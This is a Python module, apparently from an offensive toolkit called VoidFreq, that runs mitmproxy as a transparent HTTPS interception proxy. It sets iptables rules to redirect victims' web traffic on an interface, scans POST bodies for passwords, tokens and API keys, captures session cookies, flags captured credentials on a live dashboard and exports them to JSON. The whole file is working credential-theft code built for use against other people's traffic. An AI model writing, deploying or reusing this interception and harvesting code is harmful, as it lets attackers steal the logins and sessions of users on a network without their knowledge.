"""HTTPS interception proxy — mitmproxy wrapper for SSL/TLS traffic capture."""

from __future__ import annotations

import contextlib
import json
import os
import subprocess
import threading
import time
from dataclasses import dataclass, field

from rich.console import Console
from rich.live import Live
from rich.table import Table

from ..core.config import Config
from ..core.logger import get_logger
from ..core.opsec import OpsecEngine

console = Console()
log = get_logger("proxy")


@dataclass
class InterceptedRequest:
    timestamp: str
    client_ip: str
    method: str
    url: str
    host: str
    content_type: str = ""
    status_code: int = 0
    has_credentials: bool = False


@dataclass
class ProxyCapture:
    requests: list[InterceptedRequest] = field(default_factory=list)
    credentials: list[dict] = field(default_factory=list)
    cookies: list[dict] = field(default_factory=list)
    tls_info: list[dict] = field(default_factory=list)


MITM_SCRIPT = '''"""Inline mitmproxy script for VoidFreq — logs requests to a JSONL file."""

import json
import os
import time

LOG_PATH = os.environ.get("VOIDFREQ_PROXY_LOG", "/tmp/voidfreq_proxy.jsonl")

CRED_FIELDS = {"user", "pass", "login", "email", "pwd", "username", "password",
               "passwd", "credential", "secret", "token", "auth", "api_key", "apikey"}

def request(flow):
    entry = {
        "type": "request",
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S"),
        "client": flow.client_conn.peername[0] if flow.client_conn.peername else "",
        "method": flow.request.method,
        "url": flow.request.pretty_url,
        "host": flow.request.host,
        "content_type": flow.request.headers.get("content-type", ""),
    }

    if flow.request.method == "POST" and flow.request.get_text():
        text = flow.request.get_text().lower()
        if any(k in text for k in CRED_FIELDS):
            entry["credentials"] = flow.request.get_text()[:2000]
            entry["has_credentials"] = True

    cookies = flow.request.cookies
    if cookies:
        entry["cookies"] = dict(cookies)

    with open(LOG_PATH, "a") as f:
        f.write(json.dumps(entry) + "\\n")

def response(flow):
    entry = {
        "type": "response",
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S"),
        "url": flow.request.pretty_url,
        "status_code": flow.response.status_code,
        "content_type": flow.response.headers.get("content-type", ""),
    }

    if hasattr(flow.server_conn, "tls_version") and flow.server_conn.tls_version:
        entry["tls_version"] = flow.server_conn.tls_version

    set_cookies = flow.response.cookies
    if set_cookies:
        entry["set_cookies"] = {k: v[0] for k, v in set_cookies.items()}

    with open(LOG_PATH, "a") as f:
        f.write(json.dumps(entry) + "\\n")
'''


class ProxyModule:
    def __init__(self, config: Config, opsec: OpsecEngine) -> None:
        self.config = config
        self.opsec = opsec
        self.capture = ProxyCapture()
        self._proc: subprocess.Popen | None = None
        self._running = False
        self._monitor_thread: threading.Thread | None = None
        self._log_path = "/tmp/voidfreq_proxy.jsonl"
        self._script_path = "/tmp/voidfreq_proxy_script.py"

    def start(
        self, interface: str, listen_port: int = 8080, transparent: bool = True,
    ) -> bool:
        console.print(f"[cyan]Starting HTTPS proxy on :{listen_port}...[/cyan]")
        self.opsec.pre_operation()

        with open(self._script_path, "w") as f:
            f.write(MITM_SCRIPT)

        if os.path.exists(self._log_path):
            os.unlink(self._log_path)

        cmd = [
            "mitmdump",
            "--listen-port", str(listen_port),
            "-s", self._script_path,
            "--set", "stream_large_bodies=1m",
            "--ssl-insecure",
        ]

        if transparent:
            cmd.append("--mode")
            cmd.append("transparent")
            self._setup_transparent_redirect(interface, listen_port)

        env = os.environ.copy()
        env["VOIDFREQ_PROXY_LOG"] = self._log_path

        try:
            self._proc = subprocess.Popen(
                cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                env=env,
            )
        except FileNotFoundError:
            console.print("[red]mitmproxy not found — install with: pip install mitmproxy[/red]")
            return False

        time.sleep(2)
        if self._proc.poll() is not None:
            console.print("[red]Proxy failed to start[/red]")
            return False

        self._running = True
        self._monitor_thread = threading.Thread(target=self._read_log, daemon=True)
        self._monitor_thread.start()

        console.print(f"[green]HTTPS proxy active on :{listen_port}[/green]")
        if transparent:
            console.print("[dim]Transparent mode — traffic redirected via iptables[/dim]")
        log.info("Proxy started on port %d (transparent=%s)", listen_port, transparent)
        return True

    def stop(self) -> ProxyCapture:
        self._running = False

        if self._proc:
            self._proc.terminate()
            try:
                self._proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._proc.kill()
            self._proc = None

        self._cleanup_redirect()

        for path in (self._script_path, self._log_path):
            with contextlib.suppress(FileNotFoundError):
                os.unlink(path)

        console.print(
            f"[yellow]Proxy stopped — {len(self.capture.requests)} requests, "
            f"{len(self.capture.credentials)} credentials captured[/yellow]"
        )
        return self.capture

    def _setup_transparent_redirect(self, interface: str, port: int) -> None:
        cmds = [
            ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
             "-i", interface, "-p", "tcp", "--dport", "80",
             "-j", "REDIRECT", "--to-port", str(port)],
            ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
             "-i", interface, "-p", "tcp", "--dport", "443",
             "-j", "REDIRECT", "--to-port", str(port)],
        ]
        for cmd in cmds:
            subprocess.run(cmd, capture_output=True)

        self._redirect_interface = interface
        self._redirect_port = port

    def _cleanup_redirect(self) -> None:
        iface = getattr(self, "_redirect_interface", None)
        port = getattr(self, "_redirect_port", None)
        if not iface or not port:
            return

        for dport in ("80", "443"):
            subprocess.run(
                ["sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
                 "-i", iface, "-p", "tcp", "--dport", dport,
                 "-j", "REDIRECT", "--to-port", str(port)],
                capture_output=True,
            )

    def _read_log(self) -> None:
        while self._running:
            if not os.path.exists(self._log_path):
                time.sleep(0.5)
                continue

            try:
                with open(self._log_path) as f:
                    for line in f:
                        line = line.strip()
                        if not line:
                            continue
                        try:
                            entry = json.loads(line)
                        except json.JSONDecodeError:
                            continue

                        if entry.get("type") == "request":
                            req = InterceptedRequest(
                                timestamp=entry.get("timestamp", ""),
                                client_ip=entry.get("client", ""),
                                method=entry.get("method", ""),
                                url=entry.get("url", ""),
                                host=entry.get("host", ""),
                                content_type=entry.get("content_type", ""),
                                has_credentials=entry.get("has_credentials", False),
                            )
                            self.capture.requests.append(req)

                            if entry.get("has_credentials"):
                                self.capture.credentials.append({
                                    "timestamp": entry["timestamp"],
                                    "client": entry.get("client", ""),
                                    "url": entry["url"],
                                    "data": entry.get("credentials", ""),
                                })
                                console.print(
                                    f"[red bold]CRED: {req.client_ip} → {req.host}[/red bold]"
                                )

                            if entry.get("cookies"):
                                self.capture.cookies.append({
                                    "timestamp": entry["timestamp"],
                                    "host": entry.get("host", ""),
                                    "cookies": entry["cookies"],
                                })

                        elif entry.get("type") == "response":
                            if entry.get("tls_version"):
                                self.capture.tls_info.append({
                                    "url": entry["url"],
                                    "tls_version": entry["tls_version"],
                                })

                # Truncate after reading
                open(self._log_path, "w").close()

            except OSError:
                pass

            time.sleep(1)

    def live_dashboard(self) -> None:
        def build_table() -> Table:
            table = Table(title="HTTPS Proxy Dashboard")
            table.add_column("Time", style="dim", width=10)
            table.add_column("Client", style="cyan", width=16)
            table.add_column("Method", width=6)
            table.add_column("Host", style="green")
            table.add_column("URL", max_width=50)
            table.add_column("Cred", width=4, justify="center")

            for req in self.capture.requests[-25:]:
                cred_mark = "[red bold]!!!![/red bold]" if req.has_credentials else ""
                table.add_row(
                    req.timestamp.split("T")[-1] if "T" in req.timestamp else req.timestamp,
                    req.client_ip, req.method, req.host,
                    req.url[:50], cred_mark,
                )
            return table

        with Live(build_table(), refresh_per_second=1, console=console) as live:
            while self._running:
                time.sleep(1)
                live.update(build_table())

    def export(self, output_dir: str = "./reports") -> str:
        os.makedirs(output_dir, exist_ok=True)
        ts = time.strftime("%Y%m%d_%H%M%S")
        path = os.path.join(output_dir, f"proxy_capture_{ts}.json")

        data = {
            "requests": [
                {
                    "timestamp": r.timestamp,
                    "client": r.client_ip,
                    "method": r.method,
                    "url": r.url,
                    "host": r.host,
                }
                for r in self.capture.requests
            ],
            "credentials": self.capture.credentials,
            "cookies": self.capture.cookies,
            "tls_info": self.capture.tls_info,
            "stats": {
                "total_requests": len(self.capture.requests),
                "total_credentials": len(self.capture.credentials),
                "unique_hosts": len(set(r.host for r in self.capture.requests)),
            },
        }

        with open(path, "w") as f:
            json.dump(data, f, indent=2)

        console.print(f"[green]Proxy capture exported to {path}[/green]")
        return path
